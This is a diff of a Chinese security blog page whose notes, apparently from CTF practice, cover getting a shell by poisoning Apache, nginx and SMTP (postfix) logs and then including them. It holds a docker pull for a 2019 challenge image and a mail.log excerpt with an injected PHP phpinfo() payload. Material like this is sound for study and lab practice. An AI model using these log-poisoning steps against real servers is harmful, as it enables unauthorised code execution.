@@ -186,7 +186,15 @@
     </div>
   
   <article class="passage-article">
-    <h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><h3 id="nginx-日志污染getshell"><a href="#nginx-日志污染getshell" class="headerlink" title="nginx 日志污染getshell"></a>nginx 日志污染getshell</h3><p>参考链接： </p>
+    <h1 id="apache-日志污染"><a href="#apache-日志污染" class="headerlink" title="apache 日志污染"></a>apache 日志污染</h1><p>需要能读到<code>apache</code>日志</p>
+<p><img src="https://i.loli.net/2019/11/07/x73ImtKQVhfJRSP.png" alt="apache2"></p>
+<p>虽然报400错误，但是会写入<code>access.log</code></p>
+<p><img src="https://i.loli.net/2019/11/07/a8gc3vYq5MOIGWR.png" alt="image.png"></p>
+<p>包含getshell</p>
+<blockquote>
+<p>要用burp，postman不然会被urlencode</p>
+</blockquote>
+<h1 id="nginx-日志污染getshell"><a href="#nginx-日志污染getshell" class="headerlink" title="nginx 日志污染getshell"></a>nginx 日志污染getshell</h1><p>参考链接： </p>
 <blockquote>
 <p><a href="https://www.ifobnn.com/lfiwithnginxlog.html" target="_blank" rel="noopener">https://www.ifobnn.com/lfiwithnginxlog.html</a></p>
 <p><a href="http://yulige.top/?p=346" target="_blank" rel="noopener">http://yulige.top/?p=346</a> </p>
@@ -199,7 +207,7 @@
 <p>ubuntu16.04 需要把/var/log/nginx 目录权限设为645 </p>
 <p>error.log 设为至少644</p>
 </blockquote>
-<h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><p>用burp发包，浏览器会被编码</p>
+<h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><p>用burp发包，浏览器会被编码,nginx 不会对get键编码</p>
 <p><img src="https://i.loli.net/2019/11/07/ZJkcIgFLnveSM68.png" alt=""></p>
 <p>成功写入</p>
 <p><img src="https://i.loli.net/2019/11/07/gD8jtVpoR3CqNAT.png" alt="nginx-include2.png"></p>
@@ -213,13 +221,14 @@
 
 <p>不重启日志不会写进去</p>
 <hr>
-<h3 id="SMTP-日志投毒getshell-需要配合ssrf"><a href="#SMTP-日志投毒getshell-需要配合ssrf" class="headerlink" title="SMTP 日志投毒getshell(需要配合ssrf)"></a>SMTP 日志投毒getshell(需要配合ssrf)</h3><p> 出自2019年6月安恒杯的一题</p>
+<h1 id="SMTP-日志投毒getshell-需要配合ssrf"><a href="#SMTP-日志投毒getshell-需要配合ssrf" class="headerlink" title="SMTP 日志投毒getshell(需要配合ssrf)"></a>SMTP 日志投毒getshell(需要配合ssrf)</h1><p> 出自2019年6月安恒杯的一题 </p>
 <blockquote>
 <p>本地ubuntu18.04打不成，不知道为啥</p>
 </blockquote>
 <p>出题人镜像:   </p>
 <blockquote>
 <p> registry.cn-hangzhou.aliyuncs.com/bypass/postfix</p>
+<p> 失效的话用：tinmin/gophersmtp</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/bypass/postfix</span><br></pre></td></tr></table></figure>
 
@@ -234,7 +243,7 @@
 <p><img src="https://i.loli.net/2019/11/07/RZymX3OwBnTShEQ.png" alt="success"></p>
 <p>日志被污染成</p>
 <blockquote>
-<p>root@853c144383cb:/var/www/html# cat /var/log/mail.log<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: connect from localhost[127.0.0.1]<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: improper command pipelining after MAIL from localhost[127.0.0.1]: RCPT To:<?php phpinfo(); ?>\nDATA\nFrom:<a href="mailto:&#x74;&#x69;&#110;&#x6d;&#105;&#110;&#64;&#116;&#105;&#110;&#109;&#x69;&#110;&#46;&#99;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#110;&#x6d;&#105;&#110;&#64;&#116;&#105;&#110;&#109;&#x69;&#110;&#46;&#99;&#x6e;</a>\nSubject:test\nMessage:test\n.\r\n<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: Illegal address syntax from localhost[127.0.0.1] in RCPT command: <?php phpinfo(); ?><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: non-SMTP command from localhost[127.0.0.1]: From:<a href="mailto:&#x74;&#x69;&#x6e;&#x6d;&#105;&#x6e;&#x40;&#116;&#x69;&#x6e;&#109;&#105;&#x6e;&#x2e;&#99;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#x6e;&#x6d;&#105;&#x6e;&#x40;&#116;&#x69;&#x6e;&#109;&#105;&#x6e;&#x2e;&#99;&#x6e;</a><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: disconnect from localhost[127.0.0.1]</p>
+<p>root@853c144383cb:/var/www/html# cat /var/log/mail.log<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: connect from localhost[127.0.0.1]<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: improper command pipelining after MAIL from localhost[127.0.0.1]: RCPT To:<?php phpinfo(); ?>\nDATA\nFrom:<a href="mailto:&#116;&#105;&#110;&#109;&#x69;&#x6e;&#64;&#116;&#x69;&#x6e;&#x6d;&#105;&#x6e;&#x2e;&#99;&#110;" target="_blank" rel="noopener">&#116;&#105;&#110;&#109;&#x69;&#x6e;&#64;&#116;&#x69;&#x6e;&#x6d;&#105;&#x6e;&#x2e;&#99;&#110;</a>\nSubject:test\nMessage:test\n.\r\n<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: Illegal address syntax from localhost[127.0.0.1] in RCPT command: <?php phpinfo(); ?><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: non-SMTP command from localhost[127.0.0.1]: From:<a href="mailto:&#x74;&#x69;&#x6e;&#109;&#105;&#110;&#x40;&#x74;&#x69;&#110;&#x6d;&#x69;&#110;&#x2e;&#x63;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#x6e;&#109;&#105;&#110;&#x40;&#x74;&#x69;&#110;&#x6d;&#x69;&#110;&#x2e;&#x63;&#x6e;</a><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: disconnect from localhost[127.0.0.1]</p>
 </blockquote>
 
   </article>
@@ -244,7 +253,7 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-text">Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx-日志污染getshell"><span class="toc-text">nginx 日志污染getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写入"><span class="toc-text">写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMTP-日志投毒getshell-需要配合ssrf"><span class="toc-text">SMTP 日志投毒getshell(需要配合ssrf)</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#apache-日志污染"><span class="toc-text">apache 日志污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nginx-日志污染getshell"><span class="toc-text">nginx 日志污染getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写入"><span class="toc-text">写入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMTP-日志投毒getshell-需要配合ssrf"><span class="toc-text">SMTP 日志投毒getshell(需要配合ssrf)</span></a></li></ol>
   </div>
 </aside>
   
